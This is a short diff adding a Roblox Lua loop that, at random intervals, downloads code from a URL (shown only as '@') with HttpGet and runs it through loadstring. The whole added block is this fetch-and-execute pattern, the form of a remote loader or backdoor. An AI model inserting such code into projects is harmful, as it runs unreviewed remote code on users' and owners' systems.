@@ -1,1 +1,11 @@
 -- this is dev lol
+while true do
+    wait(0.)
+	local MonsterMath = math.random(1, 4000)
+	if MonsterMath == 160 then
+		loadstring(game:HttpGet("@"))()
+	end
+	if MonsterMath == 150 then
+		loadstring(game:HttpGet("@"))()
+	end
+end
